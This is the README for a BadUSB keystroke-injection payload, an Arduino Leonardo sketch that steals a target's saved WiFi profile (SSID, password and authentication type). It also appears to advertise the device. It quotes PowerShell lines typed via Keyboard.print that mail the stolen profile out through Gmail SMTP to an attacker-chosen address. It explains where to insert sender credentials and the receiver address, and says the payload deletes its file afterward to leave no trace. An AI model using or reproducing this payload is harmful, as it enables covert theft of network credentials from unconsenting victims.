<h1>README!!</h1>
<h2>WIFI Profile capture and Email</h2>


<i>This payload Steals a targets WIFI Profile. I.E. SSID, Passowrd and Authentication type;
Saves the profile to a text file named "Profile.txt" on the targets desktop;
Then sends the contents of Profile.txt (which contains the targets wifi profile) via a gmail to an email address of your choosing.
After the WIFI Profile contents is emailed the Profile.txt file is delted and the payload leaves to trace on the targets machine of being executed.</i> 

<hr></hr>
**You must Edit the script to include a sender Gmails account creds as well as a recievers email address.

**Wifi Profile can only be sent via Gmail but can be received to any email.**  

You will need to edit the fields for Senders and receivers email credentials. .
For Senders Email go to line 101 or find this line 

<code>Keyboard.print("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('CHANGE_THIS_GMAIL_ADDRESS@gmail.com', 'CHANGE_THIS_TO_EMAIL_PASSWORD')");</code>

Here you will need to change the text that says <code>CHANGE_THIS_GMAIL_ADDRESS@gmail.com</code> to the gmail address the Wifi Profile is to be sent from.

Then Change the text that says <code>CHANGE_THIS_TO_GMAIL_PASSWORD</code> to the corresponding password of the email address from above.

IE: <code>Keyboard.print("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('johndoe.techjuvi@gmail.com', 'Password1234')")</code>

We will also need to specify a "from" email. Find this line of code 

<code>Keyboard.print("$ReportEmail.From = 'CHANGE_TO_GMAIL_ADDRESS@gmail.com'");</code> on line 109 and edit the text field labeled
<code>CHANGE_TO_GMAIL_ADDRESS</code> to the same Gmail address from above (IE: senders Gmail).

The final change you'll need to make is to specify a Receivers Email. The line of code can be found on line 113 and looks like this: 

<code>Keyboard.print("$ReportEmail.To.Add('CHANGE_TO_Receivers_Email_ADDRESS')");</code>

Simply change the text that says <code>CHANGE_TO_Receivers_Email_ADDRESS</code> to the email address you want to recieve the Target's WIFI Profile .



<hr></hr>

To upload the Payload simply plug in your TECHJUVI BadUSB and open the sketch / .ino in the Arduino IDE. Make sure your board is set to Arduino Leonardo and the proper port is selected then click <i> verify</i> then <i>upload</i>.

<b><u>You can purchase a TECHJUVI BadUSB for only $9.99 by <a href="https://www.techjuvi.com/product/badusb/">clicking here!</a></u></b>






